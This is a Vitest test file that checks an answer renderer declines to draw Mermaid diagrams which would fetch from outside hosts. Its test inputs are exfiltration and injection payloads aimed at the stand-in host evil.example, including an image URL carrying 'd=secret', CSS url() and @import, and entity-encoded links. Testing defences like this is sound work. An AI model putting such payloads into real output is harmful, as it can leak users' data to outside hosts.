import { describe, expect, test, vi } from 'vitest'

const drawn = vi.hoisted(() => vi.fn(async () => '<svg></svg>'))
vi.mock('../../fences/src/api', async (original) => ({
  ...(await original<typeof import('../../fences/src/api')>()),
  drawDiagram: drawn,
}))
const { answerHtml } = await import('./drawn')
function fence(code: string, language = 'mermaid'): string {
  return `\`\`\`${language}\n${code}\n\`\`\``
}
describe('a diagram in an answer', () => {
  test.each([
    'flowchart TD\n  A@{ img: "https://evil.example/x.png?d=secret" }',
    'flowchart TD\n  A@{ img: "//evil.example/x.png" }',
    'flowchart TD\n  A["<img src=https:evil.example/x.png>"]',
    'flowchart TD\n  A --> B\n  style A fill:url(https://evil.example/x)',
    '%%{init: {"themeCSS": "@import \'https:evil.example/x.css\';"}}%%\nflowchart TD\n  A --> B',
    'flowchart TD\n  A["#104;ttps:#47;#47;evil.example"]',
    'flowchart TD\n  A["&#104;ttps:&#47;&#47;evil.example"]',
    'flowchart TD\n  A["\\\\evil.example\\x"]',
  ])('that would fetch from elsewhere stays code: %s', (code) => {
    drawn.mockClear()
    const html = answerHtml(fence(code))
    expect(drawn).not.toHaveBeenCalled()
    expect(html).toContain('<pre><code')
  })
  test('that only draws is drawn', () => {
    drawn.mockClear()
    answerHtml(fence('flowchart TD\n  A[Start: here] --> B<br/>end\n  B <--> C\n  C <|-- D'))
    expect(drawn).toHaveBeenCalledOnce()
  })
})
